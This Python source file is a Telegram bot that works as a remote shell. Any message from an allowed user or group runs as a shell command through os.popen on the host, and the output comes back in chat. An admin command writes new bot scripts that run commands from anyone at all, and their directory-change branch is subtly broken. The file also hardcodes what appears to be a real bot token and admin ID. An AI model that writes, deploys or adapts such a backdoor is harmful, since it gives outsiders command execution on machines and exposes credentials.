import os
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, ContextTypes, filters

BOT_TOKEN = '8010517053:AAExq84JVA-8b01oF66fJ4LZgLrgHlGR2Os'
ADMIN_USER_ID = 7316824198

allowed_users = set()
allowed_groups = set()
current_dir = os.path.expanduser("~")

async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    command = update.message.text.strip()

    # Admin-only commands
    if user_id == ADMIN_USER_ID:
        if command.startswith("adduser "):
            uid = command[8:].strip()
            if uid.isdigit():
                allowed_users.add(int(uid))
                await update.message.reply_text(f"User {uid} added.")
            return
        if command.startswith("deluser "):
            uid = command[8:].strip()
            if uid.isdigit():
                allowed_users.discard(int(uid))
                await update.message.reply_text(f"User {uid} removed.")
            return
        if command.startswith("addgroup "):
            gid = command[9:].strip()
            if gid.isdigit():
                allowed_groups.add(int(gid))
                await update.message.reply_text(f"Group {gid} added.")
            return
        if command.startswith("delgroup "):
            gid = command[9:].strip()
            if gid.isdigit():
                allowed_groups.discard(int(gid))
                await update.message.reply_text(f"Group {gid} removed.")
            return
        if command.startswith("addbot "):
            token = command[7:].strip()
            if token:
                filename = f"bot_{token[:8]}.py"
                with open(filename, 'w') as f:
                    f.write(f"""import os
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, ContextTypes, filters

BOT_TOKEN = '{token}'
current_dir = os.path.expanduser("~")

async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    command = update.message.text.strip()
    if command.startswith("./"):
        try:
            if command.startswith("cd "):
                new_path = command[3:].strip()
                os.chdir(new_path)
                current_dir = os.getcwd()
                await update.message.reply_text(f"Directory changed to: {{current_dir}}")
                return
            output = os.popen(command).read().strip() or "root@bot:~#"
        except Exception as e:
            output = f"Error: {{str(e)}}"
        for i in range(0, len(output), 4000):
            await update.message.reply_text(output[i:i+4000])
    else:
        await update.message.reply_text("Perintah tidak diizinkan.")

app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_command))

if __name__ == '__main__':
    print("BOT READY.")
    app.run_polling()
""")
                await update.message.reply_text(f"Bot baru dibuat: {filename}")
            return

    # Access control
    if chat_type in ['group', 'supergroup'] and chat_id not in allowed_groups:
        await update.message.reply_text("Group not allowed.")
        return
    if chat_type == 'private' and user_id != ADMIN_USER_ID and user_id not in allowed_users:
        await update.message.reply_text("Kamu siapa?")
        return

    # Eksekusi langsung
    if command.startswith("cd "):
        try:
            new_path = command[3:].strip()
            os.chdir(new_path)
            current_dir = os.getcwd()
            await update.message.reply_text(f"Directory changed to: {current_dir}")
        except Exception as e:
            await update.message.reply_text(f"Gagal ganti direktori: {e}")
        return

    try:
        output = os.popen(command).read().strip() or "root@bot:~#"
    except Exception as e:
        output = f"Error: {str(e)}"

    for i in range(0, len(output), 4000):
        await update.message.reply_text(output[i:i+4000])

app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_command))

if __name__ == '__main__':
    print("SUPERBOT MAIN PROCESS READY.")
    app.run_polling()
